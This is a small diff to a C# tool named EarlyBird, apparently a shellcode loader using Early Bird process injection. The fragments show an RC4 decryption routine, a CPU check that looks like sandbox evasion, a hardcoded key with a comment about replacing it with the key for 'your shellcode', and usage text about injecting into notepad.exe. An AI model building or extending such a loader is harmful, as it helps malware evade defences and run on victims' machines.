@@ -178,6 +178,7 @@ namespace EarlyBird
                 context.s[j] = temp;
             }
         }
+        
         static void rc4Cipher(ref Rc4Context context, byte[] input, byte[] output, int length)
         {
             byte temp;
@@ -198,6 +199,7 @@ namespace EarlyBird
                 output[k] = (byte)(input[k] ^ s[(s[i] + s[j]) % 256]);
             }
         }
+        
         static bool CPUCheck()
         {
             var sysinfo = new SYSTEM_INFO();
@@ -254,7 +256,8 @@ namespace EarlyBird
             {
                 Console.WriteLine("\t> No Executable Path Given As Argument (Using Dafault {0})", DEFAULT_PROCESS);
             }
-
+            
+            // Example of encryption key. Replace it with the key used to encrypt your shellcode.
             byte[] Key = {
                 0x3f, 0x0e, 0x78, 0xed, 0x00, 0x21, 0x34, 0xaf, 0x9e, 0xbf, 0x0f, 0xc8,
                 0xf6, 0xf1, 0x29, 0x1f, 0xae, 0x00, 0xb4, 0x48, 0xf9, 0xf9, 0xfe, 0xcd,
@@ -396,6 +399,7 @@ namespace EarlyBird
 
             return new Arguments {bytes = data, processPath = processPath };
         }
+        
         private static void PrintHelp()
         {
             Console.WriteLine($"\nUsage [1]: Passing the shellcode locally and using the default process: C:\\Windows\\System32\\notepad.exe");
